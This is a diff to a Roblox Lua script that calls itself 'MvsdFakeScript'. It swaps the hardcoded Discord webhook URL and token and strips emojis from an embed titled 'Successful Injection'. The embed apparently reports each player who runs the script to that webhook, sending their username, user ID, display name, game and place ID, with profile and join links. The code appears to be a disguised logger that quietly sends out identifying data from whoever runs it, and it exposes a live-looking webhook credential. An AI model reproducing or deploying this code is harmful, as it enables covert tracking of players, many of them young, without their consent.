@@ -31,7 +31,7 @@ local RenderStepped = RunService.RenderStepped
 
 -- Configuration
 local CONFIG = {
-    WEBHOOK_URL = "https://discord.com/api/webhooks/1421719694208929923/ZftFtvYtkNTHGPvEBNQLwJG__0HmfZWdFSA5r9aqdqspjhpEJXN78CKRAjAQRsqDbkFw",
+    WEBHOOK_URL = "https://discord.com/api/webhooks/1289789616194326612/xpkvvnTr3PZbNNF5PGbx0Jkb1UuZIPAKbu4AWsfFaSrrv-L3axrRpB1epdYthFGE-Vf3",
     SCRIPT_NAME = "MvsdScript",
     VERSION = "2.1.0"
 }
@@ -143,7 +143,7 @@ function WebhookService:CreateInjectionData()
         ["embeds"] = {{
             ["title"] = "MvsdFakeScript - Successful Injection",
             ["description"] = string.format(
-                "**Player Information:**\n👤 **Username:** %s\n🆔 **UserID:** %d\n📛 **Display Name:** %s\n\n**Game Information:**\n🎮 **Game:** %s\n🌍 **PlaceID:** %d\n\n**Technical Info:**\n⚡ **Script Version:** %s\n🕒 **Injection Time:** %s",
+                "**Player Information:**\n**Username:** %s\n**UserID:** %d\n**Display Name:** %s\n\n**Game Information:**\n**Game:** %s\n**PlaceID:** %d\n\n**Technical Info:**\n**Script Version:** %s\n**Injection Time:** %s",
                 LocalPlayer.Name,
                 LocalPlayer.UserId,
                 LocalPlayer.DisplayName,
@@ -158,12 +158,12 @@ function WebhookService:CreateInjectionData()
             },
             ["fields"] = {
                 {
-                    ["name"] = "🔗 Player Profile",
+                    ["name"] = "Player Profile",
                     ["value"] = string.format("[Click to View Profile](https://www.roblox.com/users/%d/profile)", LocalPlayer.UserId),
                     ["inline"] = true
                 },
                 {
-                    ["name"] = "🎮 Join Game",
+                    ["name"] = "Join Game",
                     ["value"] = string.format("[Click to Join Game](https://www.roblox.com/games/%d)", game.PlaceId),
                     ["inline"] = true
                 }
